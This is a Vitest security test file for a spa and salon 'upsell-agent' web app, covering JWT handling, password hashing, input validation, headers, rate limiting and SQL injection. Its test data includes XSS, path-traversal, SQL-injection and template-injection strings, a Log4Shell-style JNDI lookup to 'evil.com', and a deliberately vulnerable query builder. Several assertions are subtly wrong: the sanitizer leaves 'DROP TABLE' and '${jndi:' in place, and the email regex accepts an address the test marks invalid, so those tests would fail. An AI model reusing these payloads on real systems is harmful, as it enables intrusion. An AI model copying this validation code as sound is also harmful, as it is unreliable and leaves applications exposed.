import { describe, it, expect, beforeEach, vi } from 'vitest';
import { NextRequest, NextResponse } from 'next/server';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';

describe('Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('JWT Token Security', () => {
    const secret = 'test-jwt-secret-key-that-is-long-enough';

    it('should create valid JWT tokens', () => {
      const payload = {
        userId: 'user-123',
        email: 'test@spa.com',
        businessType: 'spa'
      };

      const token = jwt.sign(payload, secret, { expiresIn: '7d' });
      expect(token).toBeDefined();
      expect(typeof token).toBe('string');
      expect(token.split('.')).toHaveLength(3); // Header.Payload.Signature
    });

    it('should verify valid JWT tokens', () => {
      const payload = {
        userId: 'user-123',
        email: 'test@spa.com',
        businessType: 'spa'
      };

      const token = jwt.sign(payload, secret, { expiresIn: '7d' });
      const decoded = jwt.verify(token, secret) as any;

      expect(decoded.userId).toBe('user-123');
      expect(decoded.email).toBe('test@spa.com');
      expect(decoded.businessType).toBe('spa');
    });

    it('should reject tokens with invalid signatures', () => {
      const payload = { userId: 'user-123' };
      const token = jwt.sign(payload, secret);
      const wrongSecret = 'wrong-secret';

      expect(() => {
        jwt.verify(token, wrongSecret);
      }).toThrow('invalid signature');
    });

    it('should reject expired tokens', () => {
      const payload = { userId: 'user-123' };
      const expiredToken = jwt.sign(payload, secret, { expiresIn: '-1s' });

      expect(() => {
        jwt.verify(expiredToken, secret);
      }).toThrow('jwt expired');
    });

    it('should reject malformed tokens', () => {
      const malformedTokens = [
        'not.a.token',
        'invalid-token-format',
        '',
        null,
        undefined,
        'header.payload', // Missing signature
        'too.many.parts.here.invalid'
      ];

      malformedTokens.forEach(token => {
        expect(() => {
          jwt.verify(token as any, secret);
        }).toThrow();
      });
    });

    it('should include appropriate claims in tokens', () => {
      const payload = {
        userId: 'user-123',
        email: 'test@spa.com',
        businessType: 'spa'
      };

      const token = jwt.sign(payload, secret, { 
        expiresIn: '7d',
        issuer: 'upsell-agent',
        audience: 'spa-salon-users'
      });

      const decoded = jwt.verify(token, secret, {
        issuer: 'upsell-agent',
        audience: 'spa-salon-users'
      }) as any;

      expect(decoded.iss).toBe('upsell-agent');
      expect(decoded.aud).toBe('spa-salon-users');
      expect(decoded.exp).toBeDefined();
      expect(decoded.iat).toBeDefined();
    });
  });

  describe('Password Security', () => {
    it('should hash passwords with bcrypt', async () => {
      const password = 'SecurePassword123!';
      const rounds = 12;
      
      const hashedPassword = await bcrypt.hash(password, rounds);
      
      expect(hashedPassword).toBeDefined();
      expect(hashedPassword).not.toBe(password);
      expect(hashedPassword.length).toBeGreaterThan(50);
      expect(hashedPassword.startsWith('$2b$')).toBe(true);
    });

    it('should verify correct passwords', async () => {
      const password = 'SecurePassword123!';
      const hashedPassword = await bcrypt.hash(password, 12);
      
      const isValid = await bcrypt.compare(password, hashedPassword);
      expect(isValid).toBe(true);
    });

    it('should reject incorrect passwords', async () => {
      const correctPassword = 'SecurePassword123!';
      const wrongPassword = 'WrongPassword123!';
      const hashedPassword = await bcrypt.hash(correctPassword, 12);
      
      const isValid = await bcrypt.compare(wrongPassword, hashedPassword);
      expect(isValid).toBe(false);
    });

    it('should use sufficient salt rounds', async () => {
      const password = 'TestPassword123!';
      const insufficientRounds = 8;
      const sufficientRounds = 12;
      
      // Test that we're using sufficient rounds
      const hashWithSufficientRounds = await bcrypt.hash(password, sufficientRounds);
      expect(hashWithSufficientRounds.includes(`$2b$${sufficientRounds}$`)).toBe(true);
      
      // Verify insufficient rounds are detected
      const hashWithInsufficientRounds = await bcrypt.hash(password, insufficientRounds);
      const extractedRounds = parseInt(hashWithInsufficientRounds.split('$')[2]);
      expect(extractedRounds).toBeLessThan(12);
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should validate email format', () => {
      const validEmails = [
        'user@example.com',
        'test.user+spa@domain.co.uk',
        'spa123@wellness-center.com'
      ];
      
      const invalidEmails = [
        'invalid-email',
        '@domain.com',
        'user@',
        'user..double.dot@domain.com',
        'user@domain',
        ''
      ];

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

      validEmails.forEach(email => {
        expect(emailRegex.test(email)).toBe(true);
      });

      invalidEmails.forEach(email => {
        expect(emailRegex.test(email)).toBe(false);
      });
    });

    it('should validate password strength', () => {
      const strongPasswords = [
        'SecurePassword123!',
        'MyStr0ng@Password',
        'Spa&Salon2024!'
      ];

      const weakPasswords = [
        'password',
        '12345678',
        'Password',
        'password123',
        'Pass!',
        ''
      ];

      // Password strength criteria: min 8 chars, uppercase, lowercase, number, special char
      const strongPasswordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;

      strongPasswords.forEach(password => {
        expect(strongPasswordRegex.test(password)).toBe(true);
      });

      weakPasswords.forEach(password => {
        expect(strongPasswordRegex.test(password)).toBe(false);
      });
    });

    it('should sanitize user inputs', () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '../../etc/passwd',
        'DROP TABLE users;',
        '${jndi:ldap://evil.com/a}',
        '{{constructor.constructor("alert(1)")()}}'
      ];

      // Basic sanitization function
      const sanitizeInput = (input: string): string => {
        return input
          .replace(/[<>]/g, '') // Remove HTML tags
          .replace(/['"]/g, '') // Remove quotes
          .replace(/[;\-\-]/g, '') // Remove SQL injection chars
          .trim()
          .substring(0, 1000); // Limit length
      };

      maliciousInputs.forEach(input => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized).not.toContain('${jndi:');
      });
    });
  });

  describe('API Security Headers', () => {
    it('should set security headers in responses', async () => {
      // Mock a typical API response with security headers
      const securityHeaders = {
        'Content-Security-Policy': "default-src 'self'; img-src 'self' data: https:; script-src 'self' 'unsafe-inline'",
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
      };

      // Verify each security header exists and has appropriate value
      expect(securityHeaders['Content-Security-Policy']).toContain("default-src 'self'");
      expect(securityHeaders['X-Content-Type-Options']).toBe('nosniff');
      expect(securityHeaders['X-Frame-Options']).toBe('DENY');
      expect(securityHeaders['X-XSS-Protection']).toContain('1; mode=block');
      expect(securityHeaders['Referrer-Policy']).toBeDefined();
      expect(securityHeaders['Permissions-Policy']).toBeDefined();
    });

    it('should not expose sensitive information in error responses', () => {
      const sensitiveInfo = {
        databaseConnectionString: 'postgresql://user:pass@localhost/db',
        apiKeys: 'sk-123456789',
        secretKey: 'super-secret-jwt-key',
        stackTrace: 'Error: Something failed\n    at /app/src/lib/openai.ts:42:15'
      };

      // Production error response should not contain sensitive details
      const productionErrorResponse = {
        error: 'Internal Server Error',
        message: 'An error occurred while processing your request',
        code: 'INTERNAL_ERROR',
        timestamp: new Date().toISOString()
      };

      // Verify no sensitive information is leaked
      const responseString = JSON.stringify(productionErrorResponse);
      expect(responseString).not.toContain('postgresql://');
      expect(responseString).not.toContain('sk-');
      expect(responseString).not.toContain('super-secret');
      expect(responseString).not.toContain('/app/src/');
    });
  });

  describe('Rate Limiting', () => {
    it('should implement rate limiting logic', () => {
      const rateLimiter = {
        windowMs: 15 * 60 * 1000, // 15 minutes
        maxRequests: 100,
        requests: new Map<string, { count: number; resetTime: number }>()
      };

      const checkRateLimit = (clientId: string): { allowed: boolean; remaining: number } => {
        const now = Date.now();
        const clientData = rateLimiter.requests.get(clientId);

        if (!clientData || now > clientData.resetTime) {
          rateLimiter.requests.set(clientId, {
            count: 1,
            resetTime: now + rateLimiter.windowMs
          });
          return { allowed: true, remaining: rateLimiter.maxRequests - 1 };
        }

        if (clientData.count >= rateLimiter.maxRequests) {
          return { allowed: false, remaining: 0 };
        }

        clientData.count++;
        rateLimiter.requests.set(clientId, clientData);
        return { allowed: true, remaining: rateLimiter.maxRequests - clientData.count };
      };

      // Test normal usage
      let result = checkRateLimit('client-1');
      expect(result.allowed).toBe(true);
      expect(result.remaining).toBe(99);

      // Test rate limit enforcement
      const client = 'rate-limited-client';
      for (let i = 0; i < 100; i++) {
        checkRateLimit(client);
      }
      
      result = checkRateLimit(client); // 101st request
      expect(result.allowed).toBe(false);
      expect(result.remaining).toBe(0);
    });
  });

  describe('Data Protection', () => {
    it('should mask sensitive data in logs', () => {
      const sensitiveData = {
        email: 'user@spa.com',
        password: 'SecurePassword123!',
        creditCard: '4111-1111-1111-1111',
        apiKey: 'sk-1234567890abcdef'
      };

      const maskSensitiveData = (data: any): any => {
        const masked = { ...data };
        
        if (masked.password) {
          masked.password = '***';
        }
        
        if (masked.email) {
          masked.email = masked.email.replace(/(.{2}).*@/, '$1***@');
        }
        
        if (masked.creditCard) {
          masked.creditCard = masked.creditCard.replace(/\d(?=\d{4})/g, '*');
        }
        
        if (masked.apiKey) {
          masked.apiKey = masked.apiKey.substring(0, 6) + '***';
        }
        
        return masked;
      };

      const maskedData = maskSensitiveData(sensitiveData);
      
      expect(maskedData.password).toBe('***');
      expect(maskedData.email).toBe('us***@spa.com');
      expect(maskedData.creditCard).toBe('****-****-****-1111');
      expect(maskedData.apiKey).toBe('sk-123***');
    });

    it('should validate file upload security', () => {
      const validateFileUpload = (file: { name: string; type: string; size: number }) => {
        const allowedTypes = ['application/pdf', 'image/jpeg', 'image/png'];
        const maxSize = 10 * 1024 * 1024; // 10MB
        const allowedExtensions = ['.pdf', '.jpg', '.jpeg', '.png'];
        
        // Check file type
        if (!allowedTypes.includes(file.type)) {
          return { valid: false, error: 'Invalid file type' };
        }
        
        // Check file size
        if (file.size > maxSize) {
          return { valid: false, error: 'File too large' };
        }
        
        // Check file extension
        const extension = file.name.toLowerCase().substring(file.name.lastIndexOf('.'));
        if (!allowedExtensions.includes(extension)) {
          return { valid: false, error: 'Invalid file extension' };
        }
        
        // Check for suspicious filename patterns
        if (file.name.includes('../') || file.name.includes('..\\')) {
          return { valid: false, error: 'Invalid file name' };
        }
        
        return { valid: true, error: null };
      };

      // Valid file
      const validFile = {
        name: 'product-brochure.pdf',
        type: 'application/pdf',
        size: 5 * 1024 * 1024 // 5MB
      };
      expect(validateFileUpload(validFile).valid).toBe(true);

      // Invalid file type
      const invalidTypeFile = {
        name: 'document.docx',
        type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        size: 1024
      };
      expect(validateFileUpload(invalidTypeFile).valid).toBe(false);

      // File too large
      const largeFile = {
        name: 'large.pdf',
        type: 'application/pdf',
        size: 20 * 1024 * 1024 // 20MB
      };
      expect(validateFileUpload(largeFile).valid).toBe(false);

      // Suspicious filename
      const suspiciousFile = {
        name: '../../../etc/passwd',
        type: 'application/pdf',
        size: 1024
      };
      expect(validateFileUpload(suspiciousFile).valid).toBe(false);
    });
  });

  describe('CORS and Cross-Site Security', () => {
    it('should validate CORS configuration', () => {
      const corsConfig = {
        origin: ['http://localhost:3000', 'https://upsell-agent.com'],
        methods: ['GET', 'POST', 'PUT', 'DELETE'],
        allowedHeaders: ['Content-Type', 'Authorization'],
        credentials: true,
        maxAge: 86400 // 24 hours
      };

      // Validate allowed origins
      expect(corsConfig.origin).toContain('http://localhost:3000');
      expect(corsConfig.origin).not.toContain('*'); // Avoid wildcard in production
      
      // Validate methods
      expect(corsConfig.methods).toContain('GET');
      expect(corsConfig.methods).toContain('POST');
      expect(corsConfig.methods).not.toContain('TRACE'); // Avoid dangerous methods
      
      // Validate headers
      expect(corsConfig.allowedHeaders).toContain('Authorization');
      expect(corsConfig.allowedHeaders).not.toContain('*'); // Avoid wildcard
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should use parameterized queries', () => {
      // Example of unsafe query (what NOT to do)
      const unsafeQuery = (userId: string) => {
        return `SELECT * FROM users WHERE id = '${userId}'`; // VULNERABLE
      };

      // Example of safe parameterized query
      const safeQuery = (userId: string) => {
        return {
          text: 'SELECT * FROM users WHERE id = $1',
          values: [userId]
        };
      };

      const maliciousInput = "'; DROP TABLE users; --";
      
      // Unsafe query would be vulnerable
      const unsafeResult = unsafeQuery(maliciousInput);
      expect(unsafeResult).toContain('DROP TABLE');

      // Safe query protects against injection
      const safeResult = safeQuery(maliciousInput);
      expect(safeResult.text).not.toContain('DROP TABLE');
      expect(safeResult.values).toContain(maliciousInput);
    });
  });
});